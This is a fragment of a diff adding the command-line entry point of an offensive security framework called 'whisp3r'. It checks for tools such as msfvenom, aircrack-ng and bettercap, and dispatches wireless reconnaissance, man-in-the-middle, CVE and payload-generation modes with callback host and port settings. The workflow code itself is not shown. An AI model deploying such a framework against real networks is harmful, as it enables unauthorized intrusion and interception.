+    atexit.register(proc_mgr.cleanup)
+    check_root()
+    required_tools = ["iw", "nmap", "msfvenom"]
+    optional_tools = ["airodump-ng", "aireplay-ng", "aircrack-ng", "bettercap", "arpspoof"]
+    for tool in required_tools:
+        if not verify_tool(tool):
+            logger.warning(f"Missing recommended tool: {tool}")
+    parser = argparse.ArgumentParser(description=f"whisp3r v{TOOL_VERSION} - Authorized Offensive Framework | Dev: {DEV_ALIAS}")
+    parser.add_argument('--authorized', action='store_true', help='Confirm explicit written authorization')
+    parser.add_argument('--dry-run', action='store_true', help='Print commands without execution')
+    parser.add_argument('-i', '--interface', help='Network/wireless interface')
+    parser.add_argument('--export', choices=['json', 'csv'], help='Export results format')
+    parser.add_argument('--mode', choices=['menu', 'wireless', 'network', 'mitm', 'cve', 'payload', 'integrated'], default='menu', help='Direct execution mode')
+    parser.add_argument('--target', help='Target IP/BSSID for direct mode')
+    parser.add_argument('--cve', help='CVE ID for direct payload generation')
+    parser.add_argument('--lhost', help='Callback IP for payload')
+    parser.add_argument('--lport', type=int, default=4444, help='Callback port')
+    args = parser.parse_args()
+    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
+    if args.mode != 'menu':
+        if args.mode == 'wireless':
+            wireless_recon_workflow(args)
+        elif args.mode == 'network':
+            network_recon_workflow(args)
+        elif args.mode == 'mitm':
+            mitm_workflow(args)
+        elif args.mode == 'cve':
+            vulnerability_analysis_workflow(args)
+        elif args.mode == 'payload':
+            payload_generation_workflow(args)
+        elif args.mode == 'integrated':
+            integrated_workflow(args)
+    else:
+        main_menu(args)
+    logger.info("Session complete. All processes cleaned up.")
+
+if __name__ == "__main__":
+    main()
